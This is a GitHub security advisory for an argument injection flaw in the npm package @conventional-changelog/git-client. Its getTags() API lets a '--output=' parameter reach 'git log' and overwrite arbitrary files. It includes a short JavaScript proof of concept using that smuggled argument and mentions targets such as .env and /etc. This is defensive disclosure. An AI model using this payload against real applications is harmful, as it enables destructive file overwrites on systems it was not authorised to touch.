# [M] @conventional-changelog/git-client has Argument Injection vulnerability

## Summary
Severity: Medium
Advisory: GHSA-vh25-5764-9wcr
CVE: CVE-2025-59433
CWE: CWE-88
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:H/UI:R/S:U/C:L/I:L/A:H (CVSS_V3)
Published: 2025-09-22
Source: https://github.com/advisories/GHSA-vh25-5764-9wcr
Type: github-advisory

## Affected
- npm: `@conventional-changelog/git-client` — affected >=0 <2.0.0

## Details
## Background on exploitation

This vulnerability manifests with the library's `getTags()` API,
which allows specifying extra parameters passed to the `git log` command. In another API by this library - `getRawCommits()` there are secure practices taken to ensure that the extra parameter `path` is unable to inject an argument by ending the `git log` command with the special shell syntax `--`.
However, the library does not follow the same practice for `getTags()` not attempts to sanitize for user input, validate the given params, or restrcit them to an allow list. Nor does it properly pass command-line flags to the `git` binary using the double-dash POSIX characters (`--`) to communicate the end of options.

Thus, allowing users to exploit an argument injection vulnerability in Git due to the
`--output=` command-line option that results with overwriting arbitrary files.

## Exploit

1. Install `@conventional-changelog/git-client@1.0.1` or earlier
2. Prepare a Git directory to be used as source
3. Create the following script for the proof-of-concept:

```js
import {
  GitClient,
} from "@conventional-changelog/git-client";

async function main() {
  const gitDirectory = "/tmp/some-git-directory";
  const client = new GitClient(gitDirectory);

  const params = ["--output=/tmp/r2d2"];
  for await (const tag of client.getTags(params)) {
    console.log(tag);
  }
}

main();
```

3. Observe new file created on disk at `/tmp/r2d2`

## Impact

While the scope is only limited to writing a file with input from the git log result, it still allows to specify and overwrite any arbitrary files on disk, such as `.env` or as far as critical system configuration at `/etc` if the application is running as privileged `root` user.

It may be the library's design choice to expose a generic `params` object to allow any consuming users to specify random Git command line arguments, however it could be abused by attackers when developers aren't aware of the security risks which aren't communicated. As such, I recommend not ignoring, and either patching this insecure design gap with hardened secure coding practices (like in other APIs mentioned previously) or adding a security disclaimer to this library's documentation.

# Author / Credit

Liran Tal

## References
- https://github.com/conventional-changelog/conventional-changelog/security/advisories/GHSA-vh25-5764-9wcr
- https://nvd.nist.gov/vuln/detail/CVE-2025-59433
- https://github.com/conventional-changelog/conventional-changelog/commit/d95c9ffac05af58228bd89fa0ba37ad65741c6a2
- https://github.com/conventional-changelog/conventional-changelog
